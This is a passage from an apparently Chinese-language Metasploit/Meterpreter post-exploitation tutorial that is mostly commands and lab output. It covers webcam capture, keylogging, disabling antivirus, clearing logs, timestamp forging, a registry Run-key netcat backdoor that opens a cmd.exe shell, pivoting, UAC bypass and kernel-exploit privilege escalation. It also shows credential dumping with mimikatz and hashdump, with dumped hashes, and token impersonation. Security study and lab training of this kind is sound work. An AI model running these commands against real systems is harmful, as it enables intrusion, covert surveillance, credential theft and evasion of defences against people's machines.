class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># 会话管理</span><br><span class="line">background  #将当前会话放置后台</span><br><span class="line">sessions  # 查看会话</span><br><span class="line">sessions -i  # 切换会话</span><br><span class="line">quit  # 关闭当前的会话，返回msf终端</span><br><span class="line"></span><br><span class="line"># 系统设置</span><br><span class="line">sysinfo  # 查看目标机系统信息</span><br><span class="line">idletime  # 查看目标机闲置时间</span><br><span class="line">reboot/shutdown   # 重启/关机</span><br><span class="line"></span><br><span class="line"># shell</span><br><span class="line">shell  # 获得控制台权限</span><br><span class="line">irb  # 进入ruby终端</span><br><span class="line"></span><br><span class="line"># 进程迁移</span><br><span class="line">getpid    # 获取当前进程的pid</span><br><span class="line">ps   # 查看当前活跃进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line">kill &lt;pid值&gt;   #杀死进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line"></span><br><span class="line"># 执行文件</span><br><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span><br><span class="line"></span><br><span class="line"># 摄像头命令</span><br><span class="line">webcam_list  #查看摄像头列表</span><br><span class="line">webcam_chat  # 查看摄像头接口</span><br><span class="line">webcam_snap   #通过摄像头拍照</span><br><span class="line">webcam_stream   #通过摄像头开启视频</span><br><span class="line"></span><br><span class="line"># uictl开关键盘/鼠标</span><br><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标</span><br><span class="line">uictl disable mouse  #禁用鼠标</span><br><span class="line">uictl disable keyboard  #禁用键盘</span><br><span class="line"></span><br><span class="line"># 远程桌面/截屏</span><br><span class="line">enumdesktops  #查看可用的桌面</span><br><span class="line">getdesktop    #获取当前meterpreter 关联的桌面</span><br><span class="line">screenshot  #截屏</span><br><span class="line">use espia  #或者使用espia模块截屏  然后输入screengrab</span><br><span class="line">run vnc  #使用vnc远程桌面连接</span><br><span class="line"></span><br><span class="line"># 键盘记录</span><br><span class="line">keyscan_start  #开始键盘记录</span><br><span class="line">keyscan_dump   #导出记录数据</span><br><span class="line">keyscan_stop #结束键盘记录</span><br><span class="line"></span><br><span class="line"># 添加用户，开启远程桌面</span><br><span class="line"># 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令</span><br><span class="line">run post/windows/manage/enable_rdp  #开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662</span><br><span class="line"></span><br><span class="line"># 关闭防病毒软件</span><br><span class="line">run killav</span><br><span class="line">run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line"># 修改注册表</span><br><span class="line">reg –h # 注册表命令帮助</span><br><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#x27; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line">nc -v 192.168.81.162 443  #攻击者连接nc后门</span><br><span class="line"></span><br><span class="line"># 清理日志</span><br><span class="line">clearav  #清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure>

<h3 id="4-2-文件系统命令-3"><a href="#4-2-文件系统命令-3" class="headerlink" title="4.2 文件系统命令"></a>4.2 文件系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat/ls/cd/rm  # 基本命令</span><br><span class="line">search -f *pass* -d C:\\windows # 搜索文件  -h查看帮助</span><br><span class="line">getwd/pwd  # 获取当前目录</span><br><span class="line">getlwd/lpwd   # 操作攻击者主机 查看当前目录</span><br><span class="line">upload /tmp/hack.txt C:\\lltest # 上传文件</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/  # 下载文件</span><br><span class="line">edit c:\\1.txt  # 编辑或创建文件  没有的话，会新建文件</span><br><span class="line">mkdir lltest2  # 只能在当前目录下创建文件夹</span><br><span class="line">rmdir lltest2  # 只能删除当前目录下文件夹</span><br><span class="line">lcd /tmp   # 操作攻击者主机 切换目录</span><br><span class="line"></span><br><span class="line"># timestomp伪造文件时间戳</span><br><span class="line">timestomp C:// -h   #查看帮助</span><br><span class="line">timestomp -v C://2.txt   #查看时间戳</span><br><span class="line">timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</span><br></pre></td></tr></table></figure>

<h3 id="4-3-网络命令-3"><a href="#4-3-网络命令-3" class="headerlink" title="4.3 网络命令"></a>4.3 网络命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># 基本</span><br><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #查看代理信息</span><br><span class="line">route   #查看路由</span><br><span class="line"></span><br><span class="line"># portfwd端口转发</span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 # 将目标机的3389端口转发到本地6666端口</span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加路由</span><br><span class="line"></span><br><span class="line"># 方式一autoroute （deprecated）</span><br><span class="line">run autoroute –h #查看帮助</span><br><span class="line">run autoroute -s 192.168.2.0/24  #添加到目标环境网络</span><br><span class="line">run autoroute –p  #查看添加的路由</span><br><span class="line"># 方式二post/multi/manage/autoroute</span><br><span class="line">run post/multi/manage/autoroute CMD=autoadd #自动添加到目标环境网络</span><br><span class="line">run post/multi/manage/autoroute CMD=print # 查看添加的路由</span><br><span class="line">(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))</span><br><span class="line"></span><br><span class="line"># 然后可以利用arp_scanner、portscan等进行扫描</span><br><span class="line">run arp_scanner -r 192.168.2.0/24</span><br><span class="line">run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0</span><br><span class="line"></span><br><span class="line"># autoroute添加完路由后，还可以利用msf自带的模块进行socks代理</span><br><span class="line"># msf提供了2个模块用来做socks代理。</span><br><span class="line"># auxiliary/server/socks_proxy</span><br><span class="line"># use auxiliary/server/socks_unc</span><br><span class="line"># 先background退出来，然后：</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"># 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080</span><br><span class="line"># 最后proxychains 使用Socks5代理访问</span><br><span class="line"></span><br><span class="line"># sniffer抓包</span><br><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2   #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2   #查看状态</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包</span><br><span class="line">sniffer_stop 2   #停止抓包</span><br></pre></td></tr></table></figure>

<h3 id="4-4-信息收集-3"><a href="#4-4-信息收集-3" class="headerlink" title="4.4 信息收集"></a>4.4 信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 信息收集的脚本位于：</span><br><span class="line"># modules/post/windows/gather</span><br><span class="line"># modules/post/linux/gather</span><br><span class="line"># 以下列举一些常用的</span><br><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br></pre></td></tr></table></figure>

<h3 id="4-5-提权-3"><a href="#4-5-提权-3" class="headerlink" title="4.5 提权"></a>4.5 提权</h3>1.getsystem提权<br>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem  </span><br></pre></td></tr></table></figure>

2.bypassuac<br>用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。msf提供了如下几个模块帮助绕过UAC：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure>

使用方法类似，运行后返回一个新的会话，<strong>需要再次执行getsystem获取系统权限</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 示例</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: SAUCERMAN\TideSec</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; set SESSION 4</span><br><span class="line">SESSION =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.81.154</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700</span><br><span class="line">[-] Exploit failed [timeout-expired]: Timeout::Error execution expired</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"># 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功</span><br><span class="line"># 然鹅这里失败了</span><br></pre></td></tr></table></figure>

3.内核漏洞提权无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息</span><br><span class="line">msf5 &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf5 &gt; set SESSION 2</span><br><span class="line">msf5 &gt; exploit</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; search MS13-081</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                             Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                             ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menu</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4</span><br><span class="line">session =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"># 然鹅失败了，摸摸头</span><br></pre></td></tr></table></figure>

<h3 id="4-6-获取凭证-3"><a href="#4-6-获取凭证-3" class="headerlink" title="4.6 获取凭证"></a>4.6 获取凭证</h3>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。1.使用mimikatz<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs ...</span><br><span class="line">[+] Got SeDebugPrivilege.</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;996     Negotiate  WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;48748   NTLM                                    </span><br><span class="line">0;999     NTLM       WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;476238  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line">0;476209  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : saucerman</span><br><span class="line">BootKey    : 691cff33caf49e933be97fcee370256a</span><br><span class="line">RegOpenKeyEx SAM : (0x00000005) �ݿ� </span><br><span class="line">Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>使用meterpreter的run hashdump命令</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">TideSec:&quot;123456&quot;</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>

3.post/windows/gather/smart_hashdump从上面也可以看出官方推荐<code>post/windows/gather/smart_hashdump</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[+]     TideSec:&quot;123456&quot;</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>

4.powerdump<br>同 hashdump，但失败了<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run powerdump</span><br><span class="line">[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Running PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...</span><br><span class="line">[*] Setting ExecutionPolicy to Unrestricted...</span><br><span class="line">[*] Dumping the SAM database through PowerShell...</span><br><span class="line"></span><br><span class="line">[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</span><br></pre></td></tr></table></figure>

<h3 id="4-7-假冒令牌-3"><a href="#4-7-假冒令牌-3" class="headerlink" title="4.7 假冒令牌"></a>4.7 假冒令牌</h3>在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.incognito假冒令牌</span><br><span class="line">use incognito      #help incognito  查看帮助</span><br><span class="line">list_tokens -u    #查看可用的token</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  #假冒SYSTEM token</span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\</span><br><span class="line">execute -f cmd.exe -i –t    # -t 使用假冒的token 执行</span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   #返回原始token</span><br><span class="line"></span><br><span class="line"># 2.steal_token窃取令牌</span><br><span class="line">steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps</span><br><span 